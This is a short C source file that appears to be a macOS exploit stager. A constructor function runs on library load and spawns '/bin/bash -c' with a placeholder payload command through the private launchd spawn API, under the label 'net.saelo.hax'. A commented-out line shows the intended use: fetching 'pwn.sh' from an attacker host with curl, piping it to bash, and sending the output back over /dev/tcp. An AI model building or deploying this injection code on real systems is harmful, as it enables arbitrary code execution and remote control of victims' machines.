#include <stdlib.h>

#include <mach/mach_port.h>

struct spawn_via_launchd_attr {
  uint64_t spawn_flags;
  const char *spawn_path;
  const char *spawn_chdir;
  const char * const * spawn_env;
  const mode_t *spawn_umask;
  mach_port_t *spawn_observer_port;
  const cpu_type_t *spawn_binpref;
  size_t spawn_binpref_cnt;
  void * spawn_quarantine;
  const char *spawn_seatbelt_profile;
  const uint64_t *spawn_seatbelt_flags;
};

#define spawn_via_launchd(a, b, c) _spawn_via_launchd(a, b, c, 3)
pid_t _spawn_via_launchd(const char *label, const char * const *argv, const struct spawn_via_launchd_attr *spawn_attrs, int struct_version);

const char payload_cmd_placeholder[1024] = "PAYLOAD_CMD_PLACEHOLDER";

__attribute__((constructor))
void _injection()
{
  const char* argv[] = {
    "/bin/bash",
    "-c",
    payload_cmd_placeholder,
    /*"open /Applications/Calculator.app/Contents/MacOS/Calculator",*/
    /*"curl http://" HOST ":" HTTP_PORT "/pwn.sh | bash > /dev/tcp/" HOST "/" TCPLOG_PORT " 2>&1",*/
    0,
  };

  mach_port_t mpo = MACH_PORT_NULL;
  struct spawn_via_launchd_attr attrs;
  memset(&attrs, 0, sizeof(attrs));
  attrs.spawn_observer_port = &mpo;

  spawn_via_launchd("net.saelo.hax", argv, &attrs);
}
